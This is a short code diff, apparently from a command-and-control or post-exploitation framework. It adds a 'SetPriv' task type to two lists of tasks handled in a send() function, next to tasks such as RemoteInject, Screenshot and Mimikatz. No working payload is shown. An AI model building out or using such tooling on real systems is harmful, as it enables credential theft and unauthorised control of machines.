@@ -356,6 +356,7 @@ def send():
                 tasktype.Download.value,
                 tasktype.RemoteInject.value,
                 tasktype.ListPrivs.value,
+                tasktype.SetPriv.value,
                 tasktype.Screenshot.value,
                 tasktype.Mimikatz.value
             ):
@@ -393,6 +394,7 @@ def send():
                     tasktype.Download.value,
                     tasktype.RemoteInject.value,
                     tasktype.ListPrivs.value,
+                    tasktype.SetPriv.value,
                     tasktype.Screenshot.value,
                     tasktype.Mimikatz.value
                 ):
